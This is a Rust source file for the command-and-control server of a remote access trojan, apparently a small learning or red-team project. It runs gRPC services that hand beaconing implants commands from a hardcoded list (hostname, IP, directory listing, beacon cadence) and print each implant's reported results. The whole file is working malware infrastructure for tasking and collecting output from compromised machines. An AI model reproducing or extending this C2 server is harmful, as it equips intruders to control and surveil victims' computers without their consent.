use remote_access_trojan::rat::RatCommand;
use remote_access_trojan::rat::ask_for_instructions_server::{AskForInstructions, AskForInstructionsServer};
use remote_access_trojan::rat::record_command_result_server::{RecordCommandResult, RecordCommandResultServer};
use remote_access_trojan::rat::{Beacon, Empty, CommandRequest, CommandResponse};
use std::collections::HashMap;
use std::fmt;
use tonic::{Request, Response, Status};
use tonic::transport::Server;

#[derive(Debug)]
struct FormattableRatCommand(RatCommand);

impl fmt::Display for FormattableRatCommand {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f, "{self:?}")
    }
}

fn pretty_print_command(command: RatCommand) -> String {
    let command = FormattableRatCommand(command).to_string();
    let command: Vec<&str> = command.split("(").collect();
    let command = command[command.len() - 1];
    let command: Vec<&str> = command.split(")").collect();
    command[0].to_lowercase().to_string()
}

#[derive(Default)]
pub struct MyAskForInstructions {}

#[tonic::async_trait]
impl AskForInstructions for MyAskForInstructions {
    async fn send(&self, request: Request<Beacon>) -> Result<Response<CommandRequest>, Status> {
        let fake_commands = HashMap::from([
            (0, (RatCommand::Hostname, "".to_string())),
            (1, (RatCommand::Ip, "".to_string())),
            (2, (RatCommand::Ls, "".to_string())),
            (3, (RatCommand::Cadence, "2".to_string())),
        ]);
        let number: usize = request.into_inner().requested_command.try_into().unwrap();
        if fake_commands.len() > number {
            Ok(Response::new(
                CommandRequest {
                    command: RatCommand::try_into(fake_commands[&number].0).unwrap(),
                    arguments: fake_commands[&number].1.clone()
                }
            ))
        } else {
            Ok(Response::new(
                CommandRequest {
                    command: RatCommand::try_into(RatCommand::None).unwrap(),
                    arguments:String::from("")
                }
            ))
        }
    }
}

#[derive(Default)]
pub struct MyRecordCommandResult {}

#[tonic::async_trait]
impl RecordCommandResult for MyRecordCommandResult {
    async fn send(&self, request: Request<CommandResponse>) -> Result<Response<Empty>, Status> {
        let request = request.into_inner();
        let implant_id = request.implant_id;
        let timestamp = request.timestamp;
        let command = pretty_print_command(RatCommand::from_i32(request.command).unwrap());
        let arguments = request.arguments;
        let result = request.result;
        println!("{implant_id},{timestamp},{command},{arguments},{result}");
        Ok(Response::new(
            Empty {}
        ))
    }
}


#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("server");

    // Can I send a stand up the server?
    let ip_address = rco_config::LISTENER_IP;
    let port = rco_config::LISTENER_PORT;
    let socket = format!("{ip_address}:{port}").parse()?;

    Server::builder()
        .add_service(AskForInstructionsServer::new(MyAskForInstructions::default()))
        .add_service(RecordCommandResultServer::new(MyRecordCommandResult::default()))
        .serve(socket)
        .await?;

    Ok(())
}